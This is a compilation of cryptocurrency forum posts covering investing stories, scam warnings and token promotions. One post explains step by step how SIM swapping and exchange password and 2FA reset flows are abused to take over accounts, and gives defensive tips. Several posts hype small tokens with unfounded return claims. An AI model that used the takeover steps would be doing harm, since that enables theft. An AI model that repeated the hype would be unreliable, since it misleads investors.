It's hard to see at the moment that NFTs have uses beyond silly pictures as commonly seen right now, but they are rather as a cross platform, international digital rights management deed to a digital good that credits the creator and allows portability and recallability on an open real world market which is their true valuable in crypto and the world.

I've been using spreadsheets to analyze large quantities of select data for a few years now just for fun. This year I've been compiling information on various ratios dealing with potential Collatz Orbits.

What struck me when learning about the rules of mining Bitcoin is the relation to hash functions. The more metadata you gather, or data mine, on a set of numbers, the closer to an algorithm you get.

Regarding the particular hash function associated with Bitcoin, y'all will know it has to do with creating a certain number of zeros at the beginning.

The number of operations going per second in the world is something like a few quintillion.

With so much information on what creates zeros, when a result pops up with 256 zeros and another with 255 and 254, the likelihood of the controllers of the data having a way to manipulate the hash function is massive.

In cybersecurity, the ability to algorithmically create a hash function to match any image or song or type of data would threaten the safety of government files all over the world.

It's almost like having the power to see a password prompt and use a program to guess it right every time for 256 alphanumeric characters.

Interestingly enough, if one could create a formula to predict potential Collatz Orbits and get there by following the line through to success, my prediction is that they also be able to do the same with ease for Bitcoin.

Thus someone with nefarious intent can manipulate people into brute forcing a hacking tool to breach international security protocols on all computers.

It's a matter of finding the right angle to look at the numbers. Luckily computers and bots are limited in creative analytics.

I believe that applying Euler's number to its original application, compound interest, has much higher potential to earn big money fast, and moral practices.

For that reason I cannot endorse cryptocurrency in general. The data mining implications are so clear to me that I'm legitimately nervous to even talk about these thoughts. 

Here goes nothing though.

Not going to convince anyone to research it

To keep things short il summarise for you that dont know or have yet to learn about who and what we do.

In the 3/4 months that EverRise has been live weve

Created EverOwn which allows projects to hand over their contract so no rug pulls can be performed while giving the community the chance to vote if they want to give it back to the dev for development. (Short version)

Invented the buy back so every crypto you see with a buyback function is a fork of EverRise code.

Created a bridge from bnb-eth-poly with speeds of 10 seconds (fastest available). This will all be active in V2.

Team is fully doxxed.

V2 will be happening mid this month which brings a consolidated supply of 72 Billion tokens. 6% tax to feed the kraken which is our safety net against big sells and the bought tokens will be distributed to stakers.

Staking will give you 1X every month you hold for example if you stake for 6 months you get 6X your bag size proportionate to your percentage of the pool.

We have 2 listings 1 with a top 5 exchange and 1 with top 15 coming shortly after migration.

A suit of Dapps EverOwn EverSale Everswap Evermigrate.

Verified on Twitter

90,000+ holders

Marketing hasnt even begun especially in the U.S which is a huge market.

The team has hands down out performed any project in the bsc space.

Theres about 50 other points that I should really make but If you havent already understood the future and utility of this coin from what youve just read visit their telegram or website to understand exactly what they have to offer.

I can very confidently say this coin is more than deserving of a X billion market cap in the short term and by mid month will have launched on 3 chains with 1 supply. Current MC is about 50M. Il let you do the math on the returns ..

Many users of this sub holding their funds on an exchange. Thats not so safe as many think. Here i will show you how your account can get hacked. This requires that you use "Google Authenticator 2FA".

&amp;#x200B;

1. **Get your Email and Phone number** \- your Email and Phone number can be found on the leaked Ledger database, BitcoinTalk database, YahooMail database, and the coinmarketcap database and many more. Most of them are sold in the darknet
2. **Determine the phone carrier** \- There are many tools on the Internet that can be used to find out the provider
3. **SIM Swap your phone number** \- This is not always easy. Usually, the attaker either have to take a part-time job with a mobile carrier or bribe a friend who works there. But there are reports that a SIM swap can be bought in the darknet for less than $20
4. **Claim "lost password" on Email account** \- In most cases, the attacker causes the email provider to send a one-time password to the stored phone. Thus, the attacker now has access to your email address through SIM swapping. Also, in some cases, the user database leak, like with YahooMail, will include the password.
5. **Get the userid of the exchange** \- Most users like WRoss@gmail.com use the same user name "WRoss" for their Exchange account
6. **Claim lost password on Exchange** \- With the guessed user ID, the attacker can submit a lost password request. Exchanges then send a link to the lost password to your email address. Since the attacker has access to your email he can change your password , however he still needs the 2FA to get full access. 
7. **Claim lost phone (2FA) on Exchange** \- On some exchanges, users can simply remove Authenticator 2FA from their account by specifying "2FA lost". This triggers a confirmation email, but since the hacker already has access to your email, they can simply confirm the email.

&amp;#x200B;

**This all takes effort, however here are a few tips on how to prevent this from happening:**

* Do not use the same user ID and always use a different password for each application. If WRoss had not reused her username for gmail and the exchange, the attacker would not be able to get into her exchange account
* Do not use the same email for your exchange and forums. If WRoss did not use the same email on CoinMarketCap and his exchange, the hacker could not access his account
* Tighten your email account security - Some email providers allow you to disable the "Lost Password" and "Lost 2FA" features for your email account. That is, if you lose your email password or 2FA, give them permission to delete your account. Many attackers do not guess your password, but simply claim to be you and that the password was lost or forgotten
* Use better 2FA - Ultimately, miserable "lost password / 2FA" workflows are not your fault and cannot be avoided, but sometimes better 2FA can help. If you use hardware 2FA, they often have different workflows than the "lost phone" workflow. Basically, you want it to be as difficult as possible to manage a lost password or 2FA. So choose the option that is the most difficult to reset
* Don't keep funds on the exchange - The problem with exchanges is that you trust them to maintain some semblance of sanity. Unfortunately, when exchanges receive thousands of lost password tickets every day, they are often tempted to relax password reset requirements. Often at the behest of the customers they are actually trying to protect. If you just stop trusting exchanges to hold your funds week after week, you can (sometimes) better secure your accounts outside of an exchange. That way, you're the only one you have to trust, not an support employee resetting your password
* Regular check if your Email and Password are leaked on [haveibeenpwned.com](https://haveibeenpwned.com)

Ideally, the exchanges would block accounts for weeks if someone pretending to be you claimed to have lost their phone with all 2FA data. But the world isn't perfect. Coinbase recently admitted that their "lost secret" workflow was flawed.

&amp;#x200B;

Just be careful out there.

Hey guys,

A few days ago I got scammed; all of the tokens and rewards I had on ACS were stolen.

How it happened?

I was trying to stake MATIC on the platform and it wasn't working. I went to telegram, typed AcyptoS in the search bar and well joined the wrong group which had the same name and the same icon.

I messaged on the group and the admin asked me to DM them. I did, they sent me a link on which I added my keys (stupid move), and the rest is history. The admin blocked me and I was kicked out of the group.

https://preview.redd.it/0q7updurlrx71.jpg?width=720&amp;format=pjpg&amp;auto=webp&amp;s=0a7ed4ddc0b237bff447657772b29931053ec8e5

Lesson#1: not your keys, not your wallet.

Lesson#2: don't take action when you're feeling impatient .

Lesson#3: be more diligent, research or ask people you trust.

Money is money .. I lost it .. I will work harder to gain it back but I can't but feel stupid about what happened.

Peace y'all and keep all your holdings very safe :)

I am with TSB right now, however yesterday they started to block any transactions I tried to make with my debit card on coinbase or binance. I contacted them and they confirmed that this in fact was not a mistake, and that they no longer facilitate payments for crypto currencies. 

Im wondering what bank or method of payment all my fellow Brits use that allowed them to? My friend is with Royal Bank of Scotland and he says that they are fine however I have read online that it is also against their terms and conditions. 

Cheers!

We get it. You bought and lost money, and still magically think you can hold through the crash. You keep telling yourself this lie that, if you somehow maybe convince people to buy it, it will skyrocket again.

It wont. That 5k you spent on it, not even knowing what you were doing? Gone. You arent getting that money back, stop trying to convince other people to waste theirs so you can somehow try to get yours back.

We can talk about it, just please stop self promoting your trash crypto in the place we talk about real money makers.

So I recently got into bot trading on 3 commas and saw another user posting about consistent profits using a [grid bots](https://help.3commas.io/en/articles/4111562-grid-bots-an-introduction-to-ai-grid-bots) on MANA (decentraland).

At first I jumped in and set up the bot without really looking into the project much except that it was booming because of Facebook announcing its new meta verse initiative, and that it was some sort of game. This isnt smart btw, setting up a bot without doing a lot of research and making sure if the price drops you dont mind holding a bag of it.

But after further reading about the project, Im extremely impressed, the amount of effort these individuals put into making a virtual world that you can go in and buy plots of land as NFTs using their token, designing something and building in game. Buying and owning a casino, playing games, music. Basically a second life in game , where the users own it.

Im staggered and excited to see what the world has to offer.

I'll be straight up, I'm in this to get rich, to afford my own home for my family, I invested a bit in the bull market of Dec 2017, and just sort of HODL'd and forgot about it.

My gains have x2 but I only put in a tiny bit to begin with. 

I see stories of people who had put in $500 in Shibu back in August and now worth $5million+ before the recent drop. 

But how do you find out about these coins before they've already popped up on places like here, by then it being too late to make any significant gains anyway?

People say to DYOR- but where do you begin? There's hundreds of ALTcoins, and there's no time. I work 2 jobs. For us working folk, time is a commodity. Unfortunately I don't have enough of this commodity to spend it. 

Is it just pure luck?

If you're already in crypto or you're getting ready to go in head first, you must know your timeline.  
Are you in for the long term? Being in crypto for the long term means you believe in fundamentals. You research your coins, you believe in them, you DCA your entries and build the portfolio. You're not shaken by any short term price. You stack your profits IN CRYPTO NOT IN FIAT.  


Are you in for the short term? You're a technical analysis person that reads charts analyzes short term market movements and know what drives the price up or down.  


Are you a narrative analysist? Your timeline falls between the short term and the long term player. You chase narratives in the market jumping from one trend to another optimizing your gain every quarter. If you're a narrative analysist chances are you made a lot from NFTs in 2021 Q3.

&amp;#x200B;

So... Which one are you?

Hey everyone. My first post was removed for lack of character count, so I guess even though I can explain and ask what I want with few characters, it's important that I bla bla bla, so here we go.

I hold both EVERRISE (ER) and Space VIKINGS (SVT). Both seem like they have potential, however SVT is younger and the team consists of young individuals. Not saying they aren't up to the task, I think they're awesome. I chatted with William (CEO) and he seems like a genuinely nice guy.

My question is, has anyone here researched both tokens? What do you think about their future? I'm not expecting 500,000%. Just want to make up whether or not I should sell some of whichever does 10x or more to buy the other with the profit. I could keep both, but for some reason, I feel like I'll miss out on a lot of gains from ER if I don't sell SVT next time it gains. But then again, if I do that and SVT moons after a year or two.

Now, you can't know, no one can, I realize that. But how do **you** work stuff like this out? I'm a student so can't buy more :/

Basic maths reminder for those who claim its ok to buy at top and just HODL.

The way math works is that -50% and climbing back up top original value are not the same.

$60K -50% is $30K

$30K +50% is $45K

To get up back to $60K you need 100% increase.

This is why it is in whales interest to crash the markets.

Snipe bot is that illegal? i can create one on pancakeswap, poocoin and uniswap. just want to know if that is not allowed? i want to know your opinion guys. thank you.  so that we can discuss things about it and having more idea in the world of cryptoverse.  anyone here got a topic related to this.   


so far what i read on googles that  Is it legal to use sniper bots? Using a service that employs the tactics mentioned above is acceptable. However, there are other uses for this type of technology that **may be illegal**: submitting fake bids or using spam email software to advertise on behalf of your website would both fall into this category.  (anyone agree to this??)

Anyone hold these? What do you think has the most potential for the future? Not looking for FA but just your guesses if you have researched them. I know ER is ahead of SVT right now but SVT is one of the few Nordic cryptos and beer as a product is relevant for Denmark alone.

At the end of 2020 my options for earning cash had flatlined. I had lost my job 2 years prior due to a deteriorating mental condition and that had been at least 3 years of hardcore alcoholism coming home to roost. My bipolar mania/schizotypal behavior had been increasingly severe for around 5 years, and so when I was faced with finding a new job for the first time since I was 25, I quickly discovered my lifelong issues with PTSD had reached a boiling point where I could not do even the most basic functions I had relied on for years for any semblance of normalcy and income.

But Ive put on a happy face. Being able to generate more money than I spend changed everything, but having to convert to fiat and exchange it for necessary buys was painful. Seeing values go up on assets I had sold is a pain everyone here knows.

So naturally I am fucking PUMPED that this bull run has shown my mother the insanity of leaving extra money laying around, and turned her from someone just doing what her kids told her into someone who knows its insane to take FIAT from me when I will gladly pay in Crypto. Now my investments outlive their time in my wallet, and the original reason I got into crypto is even more financially secure. This, amongst the infinite other tactics Ive employed to earn Crypto, has finally free me of the hopelessness that kept me in that former job and the regret that followed losing something I in reality hated.

Ive said it for years before I even knew what it meant for my own life. Ive said it to others in the hope they understand it for what it is. But I finally feel like Im living up to the mantra I inherited indirectly from a man named Kyle Reese.

The future is not set. There is no fate but what we make for ourselves.

Heres my current problem but Ive had it a few times before and never found a good resolution, maybe there isnt one?

I have around $60 of a token called BFT in my trust wallet and somehow also in meta-mask (idk wtf Im doing) but trust will allow me to convert it to what I want (BNB) for a very small gas price (.20 cents US) but the gas price has to be .. you guessed it BNB of which I have none. Anywhere I go to buy BNB the cheapest minimum purchase is $50usd worth. 

So thats it thats the question is there no way around buying a brokers minimum purchase requirement ($50) for a .20 cent gas fee 

I just wanna convert the token to BNB and send that along to my main wallet. And why the hell cant they just charge me a fee to deduct the gas fee from the value of my token and cover the gas that way???? So frustrating 

Anyway thanks in advance for any help

I see a lot of people say: "Don't fomo", but in my opinion fomo is the best way to make money if you do it in the way I am going to explain. For example, no one knew that Solana would become so big, but when you see that for example Solana is going to be the thing, you have to look for a good entry on Solana.

A good entry is when the price retraced or is stable, not when it has gone up 20x. And if you were too late to Solana, but you see how big it has become, you start looking for coins that are on the Solana ecosystem. For example Arweave has also done a 10x recently.

This post is not about Solana. The same happened with Shiba Inu. It was taking off, you missed out. It retraced, then it was stable. If you wanted to get in, that was the time. **I saw people in this subreddit say: I just bought Shiba Inu, after it had just done a 10x.**

Same thing goes for Shiba Inu, if you see it's pumping, you don't chase the big green candles, either you buy at support or you get into Floki Inu for example.

You see all attention is on Polkadot and it's pumping? You get in Kusama for example, at that price usually follows. This is the easiest way to make a lot of money, and it's how I do it as well.

If you don't fomo and don't pay attention to where the narrative is, you can keep holding XRP at 1$ forever.

Hello all, wall of text incoming.

Before I get into this - I've never made a post like this and it absolutely is not financial advice. I thought I'd take the time to write you all a little DD on an up and coming project in BSC that I'm excited about. (I know what you're thinking re: BSC, but hear me out). 

The token is called UltGG. They released in June or July this year and the token is owned by a pre-established, registered UK gaming and eSports company (the entire team is heavily doxxed also.) They ambitiously aim to create a twitch/YouTube competitor, teaser screenshots of which were recently released, with the beta platform launching in December.

The UltGG token aims to be the backbone of an eco-system which contains (I'll try to be brief and will certainly miss a lot out)

- A streaming and content creation platform to disrupt the dominance of twitch and YouTube. 0% commission taken from content creators. This platform will feature innovative features, such as the ability to hit a hotkey and save the last ~ 1 minute of gameplay, and turn it into an NFT.

- An eSports platform where tournaments will be held, with the initial aim of scouting the next generation of eSports stars. The team recently partnered with Team Gullit (a fifa eSports team owned by legendary dutch Ballon D'or Winner Ruud Gullit) They also intend to partner with a DOTA 2 team in the near future, alongside creating their own eSports roster for various games.

- Football club sponsorships and fan tokens. The team has already partnered with Birmingham City FC for this football season, with many more on the way. They've also confirmed a partnership with QPR FC starting in the 2022-23 season. They aim for ~10 teams or so, each of which will get a fan token which directly affects the ultGG ecosystem. It's also been mentioned that may be able to secure a deal with the entire English Football League (Championship and below) as an their official eSports partner.

- Staking. Staking vault went live very recently, if this is your kind of thing. The staking is with BankerDoge, another BSC project. I was dubious about the selection of Bankerdoge. The name puts me off, but so far, with what I've staked everything seems to be working as intended. 

- NFT market place. This is pretty self explanatory I reckon! But this will tie in nicely with the ability for streamers to mint their gameplay as NFTs. Imagine owning a tournament winning kill by your favourite player on an eSports team?



The Tokenomics do include a buy/sell tax and reflections. I know this will put many off and fair play, if you don't like reflection tokens that's understandable. I do believe the taxes and reflections will eventually be turned off, as the this is just to help with building the project/marketing wallet etc in the earlier days. Once the full ecosystem is up and running I imagine this will change. 

There is also a very large supply. I believe its 1000T. Again, a red flag for some of you and fair enough. They argue that the large supply is needed for such a huge ecosystem. 

Currently the project is 5m market cap, with an all time high shortly after launch of 25m. I've decided to post now because the Utility is starting to roll out and I am excited about what I've seen. Of course DYOR as ALWAYS. I get that this low of an MC won't be for everybody, but for all those who are interested, I'm happy to chat about it and I'd recommend taking a look into it for all the juicy bits I'm too lazy to write about. Sorry for the wall of text, I have no idea how to format and wrote this out just now.

Happy investing all!

I got into VET in 2017-2018 when it was still called VEN. Like many I had been hearing about Bitcoin for years, had a friend who tried to introduce me to mining, all that, but it wasnt until that monster bull run that I finally dove in.

My decision to buy VeChain was partially due to my ignorance  I simply didnt realize you could buy fractions of coins, so I assumed Bitcoin was off the table for me. But I also put some research into what was out there, and everything I found about VeChain seemed to me to make it a great buy  real world use case, dedicated team, detailed white paper and roadmap, and a low price per coin. I scrounged together whatever money I could, even sold off a few things, and threw my lot in.

And of course you know what happened next. I, like many, had just bought into crypto at the top of the bull run, and almost immediately I watched my investment dwindle to around 10% of what I had invested. 

I was gutted, and deeply ashamed. I thought about selling, but it was so little money compared to what I put it in, it felt like it didnt really matter. So instead I deleted my crypto apps and tried to forget crypto completely. 

And then at the tail end of 2020, I started hearing about Bitcoin pumping again. I checked the price of VeChain and my eyes nearly burst out of my head  my dusty and forgotten bag of shamecoins was now worth considerably more than what I had invested. Suddenly I didnt feel so bad about my investment.

The moral of the story for the new folks is that many of you are going to see your investments decrease in value in the short term. But if youve invested in good projects, you will find yourself in the green eventually. And then when the next bear market comes, you will remember how good it felt to overcome the last one, and youll be able to make better decisions about how to move forward. 

TLDR; A little bit of research and a lot of patience will pay off in the end

About a year ago I joined this sub with my first post about me joining the ranks of crypto investors with 10 bucks investment. I got a really warm welcome and 2 individuals even sent me a small amount of crypto to get me started. I was astonished. To be frank, it made me stay here for life. Later I decided to give something, even if small, back to the community so I sent a few people small amounts of crypto to get started and even set a WeNano spot near local school so that kids can get some NANO for free.I mean opening your virtual wallet and sending a small fraction of what you have to a stranger on the other side of the planet? Thats simply awesome ! Nothing too big but its really heartwarming to see how a small amount can spread happiness around. Plus in a way you are also helping yourself with spreading the knowledge about crypto and helping its mainstream adoption. Pretty damn

I mean opening your virtual wallet and sending a small fraction of what you have to a stranger on the other side of the planet? That's the future world that I was always dreaming of!

What about you fellow humans Did any of you have similar experience when gifting? Ever received crypto?

A lot of flipping has historically happened on the cryptomarket and it never forgives cryptocurrencies that don't innovate for too long...

..Or that are complete scams like the crappy ol' BiTcOnNeCT which led a few to face penalties but many to face monetary loss.

So that got me curious into seeing if other people agree with me on this view or not. Right now it seems that ADA is slowly sliding away for example. 

So what is your 5 top of the rank picks for 2022? I wanna hear from y'all!

My list of 5 strong candidates for the top 5 are:
1. BTC
2. ETH
3. BNB
4. SOL
5. DOT (followed very closly by XRP)

No problem if you mix &amp; match or add some you think that will just moonshot towards the top 5 rank positions.

This here is like gambling in a casino but without any payments to participate.

Made this [post!](https://np.reddit.com/r/CryptoCurrency/comments/ql9eek/how_much_money_would_you_have_now_if_you_had/) a few days ago, with the top 10 from one year ago and thought it would be cool to try it one year before, so here are the numbers :)  

The data is taken from coinmarketcap historical data from 11/03/2019  

Top 10 then:  

1.BTC: 2 years ago: $9235.35 now: $61554.58 up 566.51%  
2.ETH: 2 years agor: $182.43 now: $4494.97 up 2363.94  
3.XRP: 2 years ago: $0.2913 now: $1.18 up 305.08%  
4.BCH: 2 years ago: $292.71 now: $601.43 up 105.47%  
5.USDT: 2 years ago: $1.00 now: $1.00 up 0.00%  
6.LTC: 2 years ago: $58.63now: $199.76 up 240.71%  
7.BNB: 2 years ago: $20.21 now: $600.32 up 2870.41%  
8.EOS: 2 years ago: $3.28 now: $4.51 up 37.5%  
9.BSV: 2 years ago: $129.58 now: $173.43 up 33.84%  
10.XLM: 2 years ago: $0.006909 now: $0.3675 up 431.91%  

Things to note:  

-BNB was like in the 2020 post the best performer with some insane gains of 2870.41%  
-BSV was also the worst performer only going up 33.84% and out of the top 50  
-1$ in each one of them then would be now roughly 79.55$ up 695.5%  

TLDR: 79.55$

 Too often I see posts on this subreddit in the lines of: "*InsertFamousPerson* claims that *InsertCryptoCoin* will rise up to *InsertArbitraryNumber* before *InsertArbitraryDate*". The only reason somebody would say such a thing is to get the price up. If this was true insider information I would definitely not share it, because why would you. If this famous person is planning to do a rug pull which is even worse. Therefore, please ignore these posts if you come across them.

Thank you for coming to my TED talk.

I also asked about it in a comment under one post, but I don't have an answer yet. 

From time to time there are tokens of famous sports clubs and I has always wondered: what is their purpose?  when someone buys them, what do they do with them?  

If I understand it correctly then these tokens are not official and are made up by their fans (?) So anyone can do any sports or token?  

As a fan i can make a token for a UFC organization or for an artist Kanye West or Banksy e t c .. but what's the point?  

Thank you for a simple explanation for a simple person.

To keep things short il summarise for you that dont know or have yet to learn about who and what we do.

In the 3/4 months that EverRise has been live weve-

Created EverOwn which allows projects to hand over their contract so no rug pulls can be performed while giving the community the chance to vote if they want to give it back to the dev for development. (Short version)

Invented the buy back so every crypto you see with a buyback function is a fork of EverRise code.

Created a bridge from bnb-eth-poly with speeds of 10 seconds (fastest available). This will all be active in V2.

Team is fully doxxed.

V2 will be happening mid this month which brings a consolidated supply of 72 Billion tokens. 6% tax to feed the kraken which is our safety net against big sells and the bought tokens will be distributed to stakers.

Staking will give you 1X every month you hold for example if you stake for 6 months you get 6X your bag size proportionate to your percentage of the pool.

We have 2 listings 1 with a top 5 exchange and 1 with top 15 coming shortly after migration.

A suit of Dapps EverOwn EverSale Everswap Evermigrate.

Verified on Twitter

90,000+ holders

Marketing hasnt even begun especially in the U.S which is a huge market.

The team has hands down out performed any project in the bsc space.

Theres about 50 other points that I should really make but If you havent already understood the future and utility of this coin from what youve just read visit their telegram or website to understand exactly what they have to offer.

I can very confidently say this coin is more than deserving of a X billion market cap in the short term and by mid month will have launched on 3 chains with 1 supply. Current MC is about 50M. Il let you do the math on the returns ..
-------------------------------

A lot of people around seem to be searching for small cap coins hoping to make huge gains and like we read about the guy who made $5.7Billion from a $8000 in SHIBA INU investment would be really really lucky if he cashed out a fraction of that value without crashing the whole coin. 

And a lot of other coins came up w similar names like FLOKI jr, doge back and etc, idk how they come up w names like these. We even saw a lot of meme coins like dogelon mars and FLOKI inu pump after the SHIBA pump. Its ok to gamble and throw a little money into such shitcoins but once you make money off such coins you tend to look for similar profits from everywhere you invest and get rekt at some point. 

Small investments maybe cashed out but cases like $8000 turning into $5.7billion only make you a billionaire on paper. Wanna write on your tinder profile you were a billionaire? You can but any actually billionaire

There are ways like staking and cashing out the profit but not the best or safest ways 

Thank

Hello everybody! I'm sorry for the text, I'm writing through a translator. I am a representative of the ShibaArmy App mobile app! We believe in SHIBA and want the community to grow and the popularity of the coin too.

We have created an application where everyone can get a part of SHIBA for free by playing mobile games and watching YouTube. But we are limited in funds for promotion and I have heard that the power of Reddit is very great and can help us in the growth of our application, and we, in turn, will improve the quality of our application!

I started investing in crypto about a month ago and find it unbelievably exciting. I have only invested small amounts, but making $10 into $25 is quite invigorating. If I decide to invest more than $10 I try to research as much as possible about the creator and their mission.

I have some assets staking on Kraken and I am preparing to participate in some of their parachain auctions.

But I also want to give swapping a try. 

So in my ecstasy I find myself creating accounts at numerous exchanges and wallet providers.

Right now I probably have 5 accounts at various exchanges and maybe 3-4 wallets.

Is this normal or am I borderlining?

Just a quick post regarding my recent experience using this network and staking on it. Well I didnt actually get to stake as there is no liquidity to make a trade on the network. 

I first tried to bridge from MATIC network using anyswap and lost ~$80 converting straight back as there was no way to get my WETH into anything else. 

Then converted back to USDC, bridged to BSC and bridge to Harmony network using their official bridge. Now I have bscUSDC and can only swap at ViperSwap. Based on a $1000 swap I will move the price 20-30% and it wont allow that trade. 

TLDR: Im going back to MATIC

Hello,

A few weeks ago I have received a FOX token airdrop after the Shapeshift AMA [https://www.reddit.com/r/CryptoCurrencyMeta/comments/pq3vbs/shapeshift\_daos\_ama\_rewards\_and\_calculation/hdk7grs/](https://www.reddit.com/r/CryptoCurrencyMeta/comments/pq3vbs/shapeshift_daos_ama_rewards_and_calculation/hdk7grs/?context=3). Till now I didn't pay much notice, but I would actually like to sell this token. 

However, I see a lot of conflicting info. I'm aware it is possible to sell an ERC-20 token either on Uniswap or a centralized exchange, but this token was sent through the Polygon (MATIC) network. I'm really hitting a snag here. I also saw an option in Metamask to swap my FOX tokens for another coin, but I don't have enough MATIC to cover the fee. Additionally, those other tokens would still be on the MATIC network.

Could anyone give me a lead on what my best possible option is to exchange my FOX tokens to another crypto (preferably XLM or Nano)?

It is coming up to my 1 year anniversary after switching to Plutus for my everyday spending. I have dabbled with various other methods, some other crypto cards, as well as reward credit cards. My Plutus relationship is the longest one out of them all so far. This is due to the following key points.

\- I have earned 905 in plu rewards since December 2020. This gives a current market fiat value of 4552.

\- No stake lock up (un-stake whenever you want) and fully non-custodial.

\- Customer service is excellent and issues resolved in a timely fashion which far exceeds my expectations.

\- Very few cashback restrictions  just the standard money remittance types.

\- Lots of exciting features on the roadmap .

\- DEX (Only for EU customers but due back soon for GB).

\- Plans for a banking licence in 2022.

I currently have a pro account which for a 400 plu stake gives me 4% cashback on almost every purchase, from council tax to the weekly grocery shop and everything in between. You can also get a premium account that gives you 3% cashback for a 100 plu stake. A new rewards model is also in development which should be announced in the coming weeks.

People on this sub keep hating on different groups of people when they make money while investing in shitcons. But the problem is that not everyone is following this sub or general crypto news. A lot of people just throw money into crypto without thinking twice.

I remember when I bought my first crypto few years back, you know where I got it from? From some random Google ad that displayed in my browser. No idea how crypto ad targeted me in particular. I've never had any interest in crypto prior to that. That ad then took me to eToro website I think? I couldn't register with them for some reason so after short Google search (after I got intrigued about the whole thing) I've found Coinbase. With no research at all I bought my first coins just because they were available on Coinbase. 

Same things happen with shitcoins. People see an ad. They probably download some crypto app. See that popular, flavour of the month shitcoin pumping like crazy and they just ape in. And let's be honest, everyone was a crypto noob at some point, that's just human nature. 

People also laughed that some folks fell for the squid coin scam, but I bet 95% of people who bought it had no idea it was a scam. Let's be real here. "New money" is flowing into the market now and the cycle will repeat itself again and again because people are greedy. That's why those shitcoins pump like crazy. It's mostly due to hype and marketing. It's very similar to ICO crazy back in 2017, back then people would just ape into any project that look even slightly interesting. 90% of them turned out to be scams. It's the same thing now,

Do a little exercise and try remembering your first encounter with crypto and please share it here. I can tell you now that when I bought my first coins back in 2017 I was a damn noob and my experience was embarrassing to say the least. I've made many mistakes. But I am here now, more experienced. Made some decent gains over the years. A lot of those people who invest in shitcoins will also stay and sick around for longer. And it's good for adoption.

A friend made a mistake and I'm trying to help him. He sent Erc20 tokens from his Binance account to a Bep20 chain. If that makes sense. I'm able to see the transaction using Bscan. It's now saying that the token is pegged. I tried to open a Metamask wallet to see if I could somehow see the token on that but I am limited in my ability and knowledge. 

I also downloaded a trustwallet for him but again have been unable to do anything, again limited in knowledge.

I have read a link on Binance about if you sent a token to the wrong address and some information on what to do but it's a bit difficult to comprehend. 

It's for a decent amount of dollars so any help to get it back would be much appreciated.

So after all this is going to be my first Reddit Post lol
Well the story goes that I was looking for some guidance and someone just asked to sign up for Exchange sign up to this website exchange and send screenshots as proof, so they would guide me through the process of getting in on some gaming crypto that wasn't on a major exchange yet... Imidiatly alert!! Didnt go through it and just decided to ask it here... Scam right?

Sorry for this question, but very new in crypto and just trying to learn as I go, and trying not to blow out my cash on stupid decisions. We've all listened to all the stories about people giving their information to scammers since the internet became a thing, I never fell for it, and don't want to start now, specially with the fiat I work hard to get lol

I've tried to search online for information about this and can't find a thing, so maybe someone here will inlight me.

I'd like to point out our mental health in these green days.

I've been in crypto since 2017, when I bought XRP at 12 cents or something like that. 
I've come to notice how stressful investing is for me, especially on green days. I cannot stop looking at charts, commenting and reseaching while we are in bull market. Im trying to control myself but I find it almost impossible, since greed takes over and I keep falling into this loophole of always thinking of crypto market.
In a secret way, I keep wishing bear market to come because I have not enough will power to distract myself. Especially on the days when Im off work. I keep checking phone all the time and pandemic isnt doing me a favour, cant go out much to socialize. 
It leads to social disfunction, Im having problems at home with my family. Im feeling anxiety and soo much stress, while my life is practically perfect in all aspects. Got a loving, beautiful wife, two kids who are healthy ... everything a man could want.
I am sure I am not alone in this and a lot of you guys are feeling the same.

I wont give advice to you how to live your life, since I clearly cannot do it properly myself. But at least stop and think about it for a minute. Is it worth it? Even if we make millions, is it worth it?

I've heard countless times how money cant buy happiness and now Im begining to feel it.
I hope some1 will find a way out of this state, even if I do not.

To start, I'm not one of those Shiba believers.  It's another opportunity, but that's it.  I am more of an ALGO guy, tbh.

I have been hearing about Shiba for some time.  I never really considered it because I didn't think lightning could strike twice (Doge blew up and I couldn't see that happening to Shiba).  Then I got an email from Coinbase saying they were now offering Shiba, only Coinbase was telling me (and still is to this day) that Shiba isn't offered on CB.  I know this isn't true, but I get that error.

So I switched to my back-up exchange, Voyager.  I know plenty of people don't like the app, but I had $358 for free in BTC.  I sold my BTC positions and put all of it on Shiba at $0.00000757.

A month later Shiba went up drastically and my $350 turned into $3500.  It's back down a little and I believe it will do what most mainstream Cryptos are doing, up and down highs and lows.  But I will not sell any until I have $10k.  That's my goal.  If it goes to $0 or to $1Mil it's all the same to me.  It was free money anyway.

I don't know if I would have gotten into Shiba with money I earned through my job.  But I'm glad this all worked out this way.

And if anyone has questions about Voyager, feel free to reach out.

Hi guys, I'm not sure if crypto is here to stay, but I wanted to collectively ask people here, what do they think the best strategies are to do in the bear market?

\-I can think of maybe becoming a solidity developer?

\-maybe selling now and if the bear market hits next year, buying up altcoins that did great in the bear market?

\-get out of crypto completely and wait for the next BTC halving?

\-becoming a crypto advisor

\-short the market while trading?

I'm just throwing out ideas and hope others can throw in theirs and we can get a good discussion growing.

I am noticing a lot of libertarians complaining about how normies getting into the industry are ruining the original libertarian ideals that crypto started with. Well, I believe it to be true to an extent. 

Fellow libs, lets be real, in todays society we dont change the world based only on ideals, we change the world based on competition and convenience. What we have to work on is decentralized applications that people will enjoy using after making those sweet GAINZZZ. We gotta develop dApps that provide even better services than the existent centralized ones, and make it cool, get all them cool people in it, get that fine music going, series, games, etc etc. Govs and corps are already doing a great job at destroying their credibility, we just gotta get people to hop on the bandwagon by providing fun, along with gains, cuz lets not be hypocritical, we all like the gains 

For the record, I am a Libertarian, but I became one after getting into crypto for the gains, which led me to learning about how disgustingly corrupt governments are, how the economy really works and how beautiful this new technology truly is. 

Stay positive and creative, peace out everybody

Hello!
I'm in crypto world since February this year and I have learned a lot since. I invested some money in some bigger coins (Top20 coins) in this time like Cardano, VeChain, Solana... But I am still unsure on investments in new or upcoming projects. 

I am wondering what is the best way to find new projects, where to look for them and also how do you know that the project has a lot of potential? I understand that probably most of the projects have huge potential but what is that thing you look for when choosing which one to follow or invest in?

Last but not least I would love to hear some projects you are interested in investing and why? I don't want to you tell us which ones to invest in I just want to know why do you find it interesting - what drove you to it?
Thanks!

Let me start with this: 
**Holy fucking shitballs is this sub so exhausting to read sometimes.**

I see a lot of complaining about the big governments, institutions, taxes ... It's as if crypto will just somehow help solve all these problems.

Guess what? Most of us here wants to make money and not break any rules and laws in the process. 

Call your reps, vote, plant a tree, protest - that's where the most impact for change to happen right now. Not in this sub, not in whatever bag it is you're holding. Not in the foreseeable future, because almost everyone agrees that we're still EARLY. Because so long as crypto still can't break through from NFTs and memecoins, it will NOT SOLVE jackshit of whatever it is you're complaining about. 

So can we now go back to talking about crypto such as why ADA is now a stablecoin?
-------------------------------

